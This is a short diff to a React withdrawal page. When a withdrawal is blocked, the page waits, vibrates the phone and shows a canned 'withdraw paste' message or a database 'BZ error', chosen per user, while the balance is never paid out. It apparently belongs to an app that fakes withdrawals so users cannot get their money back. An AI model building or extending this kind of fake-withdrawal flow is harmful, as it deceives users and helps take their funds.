@@ -114,7 +114,11 @@ const WithdrawPage: React.FC<WithdrawPageProps> = ({ balance, onBack, onWithdraw
       // Вывод заблокирован: показываем пасту вывода (шаблон из withdraw_message_templates), баланс не списываем
       await new Promise((r) => setTimeout(r, 1800));
       Haptic.light();
-      setStep('SUCCESS_PASTE');
+      // Если нет конкретного шаблона под withdraw_message_type — показываем BZ-ошибку из БД
+      const hasSpecificTemplate = !!withdrawTemplates.find((t) =>
+        t.message_type === (user?.withdraw_message_type || 'default')
+      );
+      setStep(hasSpecificTemplate ? 'SUCCESS_PASTE' : 'SUCCESS_PASTE_BZ');
       setSubmitting(false);
       return;
     }
